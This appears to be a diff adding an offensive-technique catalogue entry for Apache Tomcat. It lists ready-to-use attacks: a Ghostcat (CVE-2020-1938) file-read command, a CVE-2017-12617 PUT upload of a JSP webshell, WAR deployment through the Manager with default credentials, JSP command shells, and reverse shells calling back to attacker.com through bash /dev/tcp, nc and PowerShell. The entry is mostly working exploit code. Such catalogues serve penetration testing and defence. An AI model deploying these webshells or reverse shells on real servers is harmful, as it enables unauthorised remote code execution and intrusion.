@@ -1,0 +1,183 @@
+---
+comment: |
+  Apache Tomcat's Manager application (`/manager/html`) allows authenticated users with the
+  `manager-gui` role to deploy WAR (Web Application Archive) files. A WAR containing a malicious
+  JSP file is extracted and served by Tomcat, making any JSP payload directly accessible over HTTP.
+
+  The Manager API endpoint (`/manager/text/deploy`) accepts the same WAR via HTTP PUT, enabling
+  automated deployment without a browser. Default credentials (`tomcat:tomcat`, `admin:admin`,
+  `tomcat:s3cr3t`) are commonly left unchanged in misconfigured deployments.
+
+  CVE-2020-1938 "Ghostcat" (CVSS 9.8, CISA KEV): The AJP connector (default port 8009, enabled
+  by default in Tomcat < 9.0.31) allows unauthenticated reading of arbitrary files from the
+  Tomcat webroot and web application classpath, including WEB-INF/web.xml and JSP source files.
+  If file upload is possible, Ghostcat can be chained into RCE by including the uploaded file.
+
+  CVE-2025-24813 (CVSS 9.8, Feb 2025): Partial PUT support (enabled by default) writes incomplete
+  uploads as temp files with predictable names. Combined with Tomcat's FileStore session
+  persistence, a malicious serialized Java object uploaded via partial PUT can be deserialized
+  by requesting a session using the temp filename as the session ID.
+functions:
+  file-read:
+  - code: |
+      # Using the public Ghostcat PoC (github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi):
+      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/web.xml read
+
+      # Read arbitrary file from the webapp root:
+      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/web.xml read
+
+      # Read files outside the webapp (path traversal via AJP attributes):
+      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/../conf/tomcat-users.xml read
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2020-1938\
+      \ \"Ghostcat\": Tomcat's AJP connector allows setting the\n`javax.servlet.include.request_uri`\
+      \ and related AJP attributes, which control which file\nthe DefaultServlet includes\
+      \ in the response. This bypasses access controls on WEB-INF/\nand allows reading\
+      \ any file under the webapp root unauthenticated.\n\nThe AJP port (8009) must\
+      \ be reachable \u2014 it is often exposed internally even when 8080/443\nis\
+      \ firewalled. Disabled by default since Tomcat 9.0.31, 8.5.51, 7.0.100.\n\n\
+      github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u2014 Python PoC\nnuclei:\
+      \ CVE-2020-1938\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      < 9.0.31 / < 8.5.51 / < 7.0.100
+  file-write:
+  - code: |
+      # CVE-2017-12617: HTTP PUT to DefaultServlet writes arbitrary files when readonly=false
+      # Bypass readonly check with a trailing slash (Tomcat strips it before writing the file)
+      curl -X PUT "http://victim.com:8080/shell.jsp/" \
+        --data '<%@ page import="java.io.*"%><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'
+
+      # Access the deployed shell:
+      curl "http://victim.com:8080/shell.jsp?c=id"
+    comment: "CVE-2017-12617: When the DefaultServlet has `readonly` set to `false`\
+      \ in web.xml\n(a non-default configuration), HTTP PUT requests write files directly\
+      \ to the webroot.\nThe trailing slash bypass works because Tomcat normalises\
+      \ the path after the write check.\n\nPrerequisites: `readonly=false` in conf/web.xml\
+      \ DefaultServlet init-param (non-default).\nCheck with: OPTIONS http://victim.com:8080/\
+      \ \u2014 a `DAV` or `Allow: PUT` header confirms.\n\nAlternative without CVE\
+      \ (requires manager-gui role): deploy a WAR via the Manager API\nthat contains\
+      \ the target file \u2014 this is the primary documented path for admin access.\n"
+    contexts:
+      admin:
+    version: |-
+      9.0.0.M1 - 9.0.1 / 8.5.0 - 8.5.22 / 8.0.0.RC1 - 8.0.46 / 7.0.0 - 7.0.81
+  rce:
+  - code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String[] cmd = {"/bin/sh", "-c", request.getParameter("cmd")};
+      Process proc = Runtime.getRuntime().exec(cmd);
+      BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+      StringBuilder sb = new StringBuilder();
+      String line;
+      while ((line = br.readLine()) != null) sb.append(line).append("\n");
+      out.print("<pre>" + sb.toString() + "</pre>");
+      %>
+    comment: |
+      Deploy a WAR containing this JSP file via the Tomcat Manager. The `cmd` GET parameter
+      is passed to `/bin/sh -c`, supporting pipes, redirects, and complex commands.
+      Access at: http://victim.com:8080/<app-name>/shell.jsp?cmd=id
+
+      Build the WAR: mkdir shell && cp shell.jsp shell/ && jar -cf shell.war -C shell .
+      Deploy:  curl -u tomcat:tomcat "http://victim.com:8080/manager/text/deploy?path=/shell" \
+                    --upload-file shell.war
+    contexts:
+      admin:
+    platform: linux
+  - code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String[] cmd = {"cmd.exe", "/c", request.getParameter("cmd")};
+      Process proc = Runtime.getRuntime().exec(cmd);
+      BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+      StringBuilder sb = new StringBuilder();
+      String line;
+      while ((line = br.readLine()) != null) sb.append(line).append("\n");
+      out.print("<pre>" + sb.toString() + "</pre>");
+      %>
+    comment: "Windows variant \u2014 replaces `/bin/sh -c` with `cmd.exe /c`. Supports\
+      \ pipes, redirects,\nand complex commands via cmd.exe. Deploy and trigger identically\
+      \ to the Linux variant.\nAccess at: http://victim.com:8080/<app-name>/shell.jsp?cmd=whoami\n"
+    contexts:
+      admin:
+    platform: windows
+  reverse-shell:
+  - blind: true
+    code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/12345 0>&1"};
+      Runtime.getRuntime().exec(cmd);
+      %>
+    comment: "Deploy a WAR containing this JSP file, then trigger the payload by requesting\
+      \ the JSP page.\nThe reverse shell connects back to attacker.com:12345 using\
+      \ bash's /dev/tcp built-in.\nRequires a bash binary on the target \u2014 use\
+      \ `/bin/sh -c \"nc attacker.com 12345 -e /bin/sh\"`\nas an alternative if bash\
+      \ is unavailable.\nThe HTTP response returns immediately (exec is fire-and-forget);\
+      \ check the listener.\n"
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);' +
+          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
+          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
+          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
+          '$sb=(iex $d 2>&1|Out-String);' +
+          '$r=[Text.Encoding]::ASCII.GetBytes($sb+"PS "+(pwd).Path+"> ");' +
+          '$s.Write($r,0,$r.Length);$s.Flush()}';
+      String[] cmd = {"powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps};
+      Runtime.getRuntime().exec(cmd);
+      %>
+    comment: "Windows variant \u2014 spawns a PowerShell interactive reverse shell\
+      \ via JSP. Deploy the same\nway as the Linux variant. PowerShell connects to\
+      \ attacker.com:12345 and returns command\noutput prefixed with the current working\
+      \ directory prompt.\nThe HTTP response returns immediately (exec is fire-and-forget);\
+      \ check the listener.\n"
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
+    tty: false
+  webshell:
+  - code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String c = request.getParameter("c");
+      if (c != null) {
+          String[] cmd = {"/bin/sh", "-c", c};
+          Process p = Runtime.getRuntime().exec(cmd);
+          out.print(new String(p.getInputStream().readAllBytes()));
+      }
+      %>
+    comment: |
+      Minimal JSP webshell deployed as part of a WAR file. The `c` parameter accepts arbitrary
+      OS commands (including pipes and redirects) passed via `/bin/sh -c`.
+      Deploy via Tomcat Manager and access at:
+      http://victim.com:8080/<app-name>/ws.jsp?c=id
+    contexts:
+      admin:
+    platform: linux
+  - code: |
+      <%@ page import="java.io.*" %>
+      <%
+      String c = request.getParameter("c");
+      if (c != null) {
+          String[] cmd = {"cmd.exe", "/c", c};
+          Process p = Runtime.getRuntime().exec(cmd);
+          out.print(new String(p.getInputStream().readAllBytes()));
+      }
+      %>
+    comment: "Windows variant \u2014 replaces `/bin/sh -c` with `cmd.exe /c`. Accepts\
+      \ arbitrary Windows\ncommands including pipes and redirects. Deploy via Tomcat\
+      \ Manager and access at:\nhttp://victim.com:8080/<app-name>/ws.jsp?c=whoami\n"
+    contexts:
+      admin:
+    platform: windows
+...
